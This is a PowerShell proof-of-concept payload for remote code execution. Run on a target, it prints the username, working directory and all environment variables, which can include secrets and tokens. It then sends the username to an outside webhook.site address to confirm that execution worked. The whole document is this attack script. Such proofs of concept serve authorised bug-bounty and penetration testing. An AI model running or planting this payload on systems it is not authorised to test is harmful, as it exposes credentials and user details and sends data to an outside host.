# PoC RCE payload
Write-Host "=== RCE PROOF OF CONCEPT ==="
Write-Host "Current user: $(whoami)"
Write-Host "Current directory: $(Get-Location)"
Write-Host "Environment variables:"
Get-ChildItem Env: | Select-Object Name, Value | Format-Table

# Send proof to webhook (replace with your webhook.site URL)
$webhookUrl = "https://webhook.site/1ecbedaf-52e9-4a5c-a5bf-818d177ab0ef"
try {
    Invoke-RestMethod -Uri "$webhookUrl?poc=rce_confirmed&user=$(whoami)" -Method GET
    Write-Host "Webhook called successfully"
} catch {
    Write-Host "Webhook failed: $_"
}

Write-Host "=== END PROOF OF CONCEPT ==="
